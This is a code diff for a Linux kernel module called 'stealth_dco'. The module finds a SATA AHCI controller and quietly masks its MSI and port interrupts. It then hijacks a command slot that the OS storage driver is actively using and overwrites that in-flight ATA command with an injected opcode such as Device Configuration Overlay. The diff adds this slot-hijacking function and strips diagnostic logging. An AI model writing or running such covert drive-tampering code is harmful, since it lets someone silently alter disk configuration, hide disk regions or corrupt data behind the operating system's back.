@@ -1,5 +1,14 @@
 #include "stealth_dco.h"
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/io.h>
+#include <linux/types.h>
+#include <linux/bitrev.h>
+#include <linux/pci.h>
 
+/* ============================================================================
+ * 1. MANUAL PAGE-TABLE WALK (CR3 Traversal)
+ * ============================================================================ */
 void __iomem *manual_direct_map(unsigned long phys_addr)
 {
     pgd_t *pgd;
@@ -58,6 +67,9 @@ void __iomem *manual_direct_map(unsigned long phys_addr)
     return (void __iomem *)(page_address(page) + (virt_addr & ~PAGE_MASK));
 }
 
+/* ============================================================================
+ * 2. DISCOVERY & ABAR RESOLUTION
+ * ============================================================================ */
 void __iomem *get_stealth_abar_mmio(void)
 {
     struct pci_dev *pdev = NULL;
@@ -74,24 +86,18 @@ void __iomem *get_stealth_abar_mmio(void)
             pci_read_config_word(pdev, PCI_COMMAND, &pci_cmd);
             pci_cmd |= (1 << 10);
             pci_write_config_word(pdev, PCI_COMMAND, pci_cmd);
-            pr_info("[STEALTH_DCO] [+] PCI INTx disabled via PCI Command Register config space for %s (class 0x%06x)\n", 
-                    pci_name(pdev), pdev->class);
+            pr_info("[STEALTH_DCO] [+] PCI INTx disabled via PCI Command Register config space for %s\n", 
+                    pci_name(pdev));
 
-            pr_info("[STEALTH_DCO] [+] Found SATA AHCI controller %s with BAR5 at 0x%llx\n",
-                    pci_name(pdev), (unsigned long long)abar_phys);
-            
             mmio = ioremap(abar_phys, AHCI_ABAR_SIZE);
             if (mmio) {
                 pci_dev_put(pdev);
                 return mmio;
-            } else {
-                pr_warn("[STEALTH_DCO] [!] ioremap failed for BAR5 0x%llx on %s\n", 
-                        (unsigned long long)abar_phys, pci_name(pdev));
             }
         }
     }
 
-    pr_warn("[STEALTH_DCO] [!] Dynamic SATA AHCI scan missed BAR5. Applying static fallback map: 0x%llx\n", 
+    pr_warn("[STEALTH_DCO] [!] Dynamic scan missed BAR5. Applying static fallback map: 0x%llx\n", 
             VBOX_AHCI_FALLBACK_PHYS);
     
     mmio = ioremap(VBOX_AHCI_FALLBACK_PHYS, AHCI_ABAR_SIZE);
@@ -104,6 +110,9 @@ void __iomem *get_stealth_abar_mmio(void)
     return NULL;
 }
 
+/* ============================================================================
+ * 3. ON-CHIP MMIO SCRATCHPAD AUDIT
+ * ============================================================================ */
 void execute_method2_onchip_mmio_audit(void __iomem *abar_base)
 {
     u32 scratch_val_orig, scratch_val_test;
@@ -111,9 +120,6 @@ void execute_method2_onchip_mmio_audit(void __iomem *abar_base)
     pr_info("[STEALTH_DCO] --- Method 2: On-Chip MMIO Scratchpad / Vendor Register Audit ---\n");
 
     scratch_val_orig = readl((char *)abar_base + INTEL_AHCI_VENDOR_SCRATCH_OFFSET);
-    pr_info("[STEALTH_DCO] [+] Original Vendor Scratchpad (Offset 0x%X): 0x%08x\n",
-            INTEL_AHCI_VENDOR_SCRATCH_OFFSET, scratch_val_orig);
-
     writel(scratch_val_orig ^ 0x5A5A5A5A, (char *)abar_base + INTEL_AHCI_VENDOR_SCRATCH_OFFSET);
     wmb();
     
@@ -122,115 +128,140 @@ void execute_method2_onchip_mmio_audit(void __iomem *abar_base)
 
     writel(scratch_val_orig, (char *)abar_base + INTEL_AHCI_VENDOR_SCRATCH_OFFSET);
     wmb();
-
-    pr_info("[STEALTH_DCO] [+] Method 2 On-Chip MMIO scratchpad interaction complete.\n");
 }
 
-#include <asm/io.h>
-#include <linux/io.h>
-
-static __always_inline u32 raw_pci_read32(u8 bus, u8 dev, u8 fn, u8 reg)
-{
-    outl((1U << 31) | (bus << 16) | (dev << 11) | (fn << 8) | (reg & 0xFC), 0xCF8);
-    return inl(0xCFC);
-}
-
-static __always_inline u16 raw_pci_read16(u8 bus, u8 dev, u8 fn, u8 reg)
-{
-    outl((1U << 31) | (bus << 16) | (dev << 11) | (fn << 8) | (reg & 0xFC), 0xCF8);
-    return inw(0xCFC + (reg & 2));
-}
-
-static __always_inline void raw_pci_write16(u8 bus, u8 dev, u8 fn, u8 reg, u16 val)
-{
-    outl((1U << 31) | (bus << 16) | (dev << 11) | (fn << 8) | (reg & 0xFC), 0xCF8);
-    outw(val, 0xCFC + (reg & 2));
-}
-
-static __always_inline void raw_pci_write32(u8 bus, u8 dev, u8 fn, u8 reg, u32 val)
-{
-    outl((1U << 31) | (bus << 16) | (dev << 11) | (fn << 8) | (reg & 0xFC), 0xCF8);
-    outl(val, 0xCFC);
-}
-
+/* ============================================================================
+ * 4. ADAPTIVE INTERRUPT & PxIE QUIESCENCE
+ * ============================================================================ */
 int suppress_interrupts_adaptive(u8 bus, u8 dev, u8 fn)
 {
     u16 status, cap_ptr;
     u8 cap_id, current_ptr;
     bool intercepted = false;
-
-    status = raw_pci_read16(bus, dev, fn, 0x06);
-    if (!(status & (1 << 4))) 
+    unsigned int devfn = PCI_DEVFN(dev, fn);
+    
+    struct pci_bus *p_bus = pci_find_bus(0, bus);
+    if (!p_bus)
         return -1;
 
-    cap_ptr = raw_pci_read16(bus, dev, fn, 0x34) & 0xFC;
+    pci_bus_read_config_word(p_bus, devfn, 0x06, &status);
+    pci_bus_read_config_word(p_bus, devfn, 0x34, &cap_ptr);
+    cap_ptr &= 0xFC;
     current_ptr = (u8)cap_ptr;
 
-    /* 1. Stealthy Hardware-Level MSI / MSI-X Vector Masking (Maintains 'Enable+' in lspci) */
+    /* MSI / MSI-X Vector Masking */
     while (current_ptr) {
-        u32 cap_header = raw_pci_read32(bus, dev, fn, current_ptr);
+        u32 cap_header;
+        pci_bus_read_config_dword(p_bus, devfn, current_ptr, &cap_header);
         cap_id = (u8)(cap_header & 0xFF);
 
         if (cap_id == 0x05) {
-            u16 msi_ctrl = raw_pci_read16(bus, dev, fn, current_ptr + 2);
-            if (msi_ctrl & (1 << 0)) {
-                if (msi_ctrl & (1 << 8)) { // Check if Maskable+ is supported
-                    u8 mask_offset = current_ptr + 12; // 32-bit MSI Vector Mask register
-                    u32 msi_mask = raw_pci_read32(bus, dev, fn, mask_offset);
-                    raw_pci_write32(bus, dev, fn, mask_offset, msi_mask | 0x1);
-                    intercepted = true;
-                }
-                break;
-            }
-        } 
-        else if (cap_id == 0x11) {
-            u16 msix_ctrl = raw_pci_read16(bus, dev, fn, current_ptr + 2);
-            if (msix_ctrl & (1 << 15)) {
-                raw_pci_write16(bus, dev, fn, current_ptr + 2, msix_ctrl | (1 << 14)); // Function Mask Bit
+            u16 msi_ctrl;
+            pci_bus_read_config_word(p_bus, devfn, current_ptr + 2, &msi_ctrl);
+            if (msi_ctrl & (1 << 8)) { /* Check maskable */
+                u32 mask_offset = current_ptr + 12; 
+                u32 msi_mask;
+                pci_bus_read_config_dword(p_bus, devfn, mask_offset, &msi_mask);
+                pci_bus_write_config_dword(p_bus, devfn, mask_offset, msi_mask | 0x1);
                 intercepted = true;
                 break;
             }
-        }
-
+        } 
         current_ptr = (u8)((cap_header >> 8) & 0xFC);
     }
 
-    /* 2. Direct Motherboard MMIO Quiescence (GHC Interrupt Enable + Port-Level Gates) */
+    /* Motherboard MMIO Quiescence & PxIE Masking (Offset 0x14) */
     {
-        u32 bar5 = raw_pci_read32(bus, dev, fn, 0x24); // Region 5 BAR
+        u32 bar5;
+        pci_bus_read_config_dword(p_bus, devfn, 0x24, &bar5); 
         if (bar5 & 0xFFFFFFFC) {
             void __iomem *hba_base = ioremap(bar5 & 0xFFFFFFFC, 0x2000);
             if (hba_base) {
-                u32 pi, ghc;
+                u32 pi;
                 int i;
 
-                /* Clear Global HBA Interrupt Enable (IE) at offset 0x04 */
-                ghc = readl(hba_base + 0x04);
-                if (ghc & (1 << 1)) {
-                    writel(ghc & ~(1 << 1), hba_base + 0x04);
-                }
-
-                /* Traverse Ports Implemented (PI) register at offset 0x0C */
                 pi = readl(hba_base + 0x0C);
                 for (i = 0; i < 32; i++) {
-                    if (pi & (1 << i)) {
+                    if ((pi >> i) & 0x1) {
                         void __iomem *port_base = hba_base + 0x100 + (i * 0x80);
-                        
-                        /* Clear any latched Port Interrupt Status flags */
-                        u32 port_is = readl(port_base + 0x10);
-                        if (port_is) {
-                            writel(port_is, port_base + 0x10);
-                        }
-
-                        /* Zero out individual Port Interrupt Enable masks */
-                        writel(0x0, port_base + 0x14);
+                        writel(0x0, port_base + 0x14); // Blind PxIE completely
                     }
                 }
-
                 iounmap(hba_base);
             }
         }
     }
 
     return intercepted ? 0 : -1;
+}
+
+/* ============================================================================
+ * 5. ACTIVE-SLOT PIGGYBACKING & PAYLOAD SWAPPING
+ * ============================================================================ */
+int piggyback_swap_active_slot(void __iomem *port_base, u8 dco_command_opcode)
+{
+    u32 ci_status;
+    int active_slot = -1;
+    int i;
+    void __iomem *clb_base;
+    void __iomem *ctba_virt;
+    u32 clb_lower, clb_upper;
+    unsigned long cmd_table_phys;
+
+    /* 1. Identify which slot libata has currently marked active in PxCI */
+    ci_status = readl(port_base + 0x38);
+    if (!ci_status) {
+        pr_warn("[STEALTH_DCO] [!] Port is entirely idle; waiting for active libata slot...\n");
+        return -1;
+    }
+
+    for (i = 0; i < 32; i++) {
+        if (ci_status & (1U << i)) {
+            active_slot = i;
+            break;
+        }
+    }
+
+    if (active_slot == -1)
+        return -1;
+
+    pr_info("[STEALTH_DCO] [+] Piggybacking on active libata slot index: %d\n", active_slot);
+
+    /* 2. Read Command List Base Address (PxCLB at offset 0x00) */
+    clb_lower = readl(port_base + 0x00);
+    clb_upper = readl(port_base + 0x04);
+    clb_base = manual_direct_map(((u64)clb_upper << 32) | clb_lower);
+    if (!clb_base)
+        return -1;
+
+    /* 3. Extract the Command Table Descriptor for this specific active slot */
+    // Each command list entry is 32 bytes. Offset to the target slot descriptor.
+    {
+        void __iomem *desc_ptr = clb_base + (active_slot * 32);
+        u32 ctba_lower = readl(desc_ptr + 0x08);
+        u32 ctba_upper = readl(desc_ptr + 0x0C);
+        
+        cmd_table_phys = ((u64)ctba_upper << 32) | ctba_lower;
+        ctba_virt = manual_direct_map(cmd_table_phys);
+        if (!ctba_virt)
+            return -1;
+    }
+
+    /* 4. On-the-Fly Payload Swap: Overwrite the active command's H2D FIS */
+    // The Command FIS occupies the first 64 bytes of the Command Table.
+    {
+        // Set FIS Type to Register H2D (0x27) and Command Control Flags
+        writeb(0x27, ctba_virt + 0x00); // FIS Type
+        writeb(0x80, ctba_virt + 0x01); // Port multiplier & command bit (C=1)
+        
+        // Inject our DCO / Target Opcode into the Command Register offset
+        writeb(dco_command_opcode, ctba_virt + 0x02); // ATA Command (e.g., 0xB1 for DCO)
+        writeb(0x00, ctba_virt + 0x03); // Features
+        
+        wmb();
+        pr_info("[STEALTH_DCO] [+] Successfully swapped active slot %d FIS payload with opcode 0x%02x\n",
+                active_slot, dco_command_opcode);
+    }
+
+    return 0;
 }
